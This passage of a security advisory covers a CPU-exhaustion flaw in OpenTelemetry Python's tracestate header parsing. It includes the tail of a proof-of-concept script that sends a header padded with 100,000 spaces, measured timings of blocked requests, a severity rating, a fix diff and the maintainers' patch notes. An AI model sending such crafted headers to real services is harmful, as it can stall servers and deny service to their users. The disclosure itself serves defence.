extra = f"traceparent: {TRACEPARENT}\r\ntracestate: a=b{' ' * N}x\r\n"
attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra)))
print("idle /ping:               %.3f s  %s" % get("/ping"))
attacker.start()
time.sleep(0.5)  # let the attack request reach the server first
print("/ping during the attack:  %.3f s  %s" % get("/ping"))
attacker.join()
print("attack request itself:    %.3f s  %s" % result["a"])
  1. In a second terminal run python attack.py 100000.
  2. What to observe: the idle /ping answers in milliseconds, but a /ping sent half a second after the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:
idle /ping:               0.000 s  HTTP/1.1 200 OK
/ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked)
attack request itself:    6.408 s  HTTP/1.1 200 OK
  1. Start the server with --http h11 instead and run the same command: the attack request is rejected immediately (400 Bad Request, h11 header cap) and /ping is not delayed. Our measurements for --http httptools: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent /ping delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent /ping delayed 11.89 s.

Severity

Likelihood: Low. Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.

Impact: Medium. One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.

Severity: Medium.

Suggested remediation

Replace the regex split with a plain split and strip; this removes the quadratic behaviour and is equivalent on valid input:

--- a/opentelemetry-api/src/opentelemetry/trace/span.py
+++ b/opentelemetry-api/src/opentelemetry/trace/span.py
@@ def from_header(cls, header_list: list[str]) -> TraceState:
         for header in header_list:
-            members: list[str] = re.split(_delimiter_pattern, header)
+            members: list[str] = [m.strip(" \t") for m in header.split(",")]

_delimiter_pattern (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with _MAX_HEADER_LENGTH. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty TraceState, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.

Credit

Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com

FROM MAINTAINERS

Summary

TraceState.from_header() in opentelemetry-api used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound tracestate headers.

Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.

Impact

Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed tracestate values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.

The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.

Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

Patches

Versions of opentelemetry-api up to and including 1.45.0 are affected.

Upgrade opentelemetry-api to version 1.45.1 or later.

Version 1.45.1 replaces the affected parsing operation with linear-time processing and discards combined tracestate headers longer than 8,192 characters.

Workarounds

Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.
